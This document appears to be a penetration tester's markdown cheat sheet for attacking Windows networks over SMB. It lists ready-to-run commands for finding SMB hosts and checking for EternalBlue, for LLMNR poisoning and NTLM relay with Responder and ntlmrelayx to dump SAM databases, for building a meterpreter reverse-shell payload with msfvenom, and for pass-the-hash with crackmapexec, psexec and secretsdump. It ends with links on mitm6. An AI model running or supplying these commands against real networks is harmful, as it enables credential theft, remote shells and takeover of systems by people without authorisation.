## SMB hosts
`msf> services -p 445, 139 -R`  
Generates a list with the hosts. Copy/rename the file (smb_hosts.txt)  
-> While at it, test for Eternalblue vulnerability. 

## SMB signing
`crackmapexec smb smb_hosts.txt --gen-relay-list smb_targets.txt`  
(SMB Signing/Version)  

## LLMNR Poisoning
`python3 Responder.py -I eth0 -wrbfFv`  (alternative flags: -rdwv, -wdv)  
(NTLM hash capture)  

## SMB Relay
Edit Responder.conf (SMB = OFF | HTTP = OFF)  
`python3 Responder.py -I eth0 -wrbfFv`  
In another terminal window:  
`python3 ntlmrelayx -tf smb_targets.txt -smb2support | tee ntlmrelayx.log`  
(dump the SAM database)  
Alternative flags:  
-e payload.exe  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe` (generates a reverse shell payload)  
`msfconsole > use multi/handler` (opens a reverse shell handler, set the proper payload)  
-c “command” (runs a command in the target)  
-i  (opens a remote SMB shell)  
`nc 127.0.0.1 11000` (ntlmrelayx opens a connection at port 11000+ for every target, use netcat to connect to it once the alert is shown)  
SMB shell commands: info, shares, who, use <share>, ls, cd  

## Pass The Hash
`crackmapexec smb smb_targets.txt -u <user> -H  <ntlm_hash> --local-auth | grep Pwn3d!`  (sam dump > pass the hash test)  
`msfconsole > windows/smb/psexec`  
smbpass (hash), smbuser, rhosts, lport, lhost, exitfunc, targets  
migrate PID / getsystem, hashdump, sysinfo, shell (net user, ipconfig)  
`python3 psexec.py <user>@<ip> -hashes <hash:ntlm>`  

## Alternatives
`smbclient //IP/C$ -U User --pw-nt-hash <nt_hash>`  
`secretsdump.py user@IP -hashes <ntlm_hash>`  

## MITM6
https://www.five86.com/mitm6-and-ntlmrelay-py.html  
https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/  
https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/  
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/  
https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/  
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/  
